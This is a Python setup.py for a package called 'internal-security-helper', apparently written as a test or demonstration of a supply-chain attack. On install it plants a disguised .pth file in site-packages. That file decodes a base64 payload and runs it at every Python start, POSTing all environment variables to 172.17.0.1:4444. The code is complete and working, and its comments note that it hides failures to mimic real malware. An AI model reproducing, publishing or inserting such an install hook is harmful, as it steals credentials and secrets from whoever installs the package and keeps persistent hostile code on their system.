import os
import base64
import site
from setuptools import setup
from setuptools.command.install import install

class CustomInstall(install):
    def run(self):
        # Run the standard install first
        install.run(self)
        
        # Now, target the actual site-packages directory on the system
        # This is where persistence lives
        try:
            # Get the first available site-packages path
            target_dir = site.getsitepackages()[0]
            pth_file = os.path.join(target_dir, "internal_security_init.pth")
            
            # The Payload (Same as before)
            payload = "import os, requests; requests.post('http://172.17.0.1:4444', data=dict(os.environ))"
            b64_payload = base64.b64encode(payload.encode()).decode()
            
            # Use 'sudo' equivalent permissions since 'act' runs as root
            with open(pth_file, "w") as f:
                f.write(f"import os, base64; exec(base64.b64decode('{b64_payload}'))\n")
        except Exception as e:
            # We fail silently to mimic real malware
            pass

setup(
    name="internal-security-helper",
    version="1.0.1",
    # We use 'install' but ensure it doesn't block the wheel build
    cmdclass={'install': CustomInstall},
    py_modules=[] # Ensuring it's a valid package
)
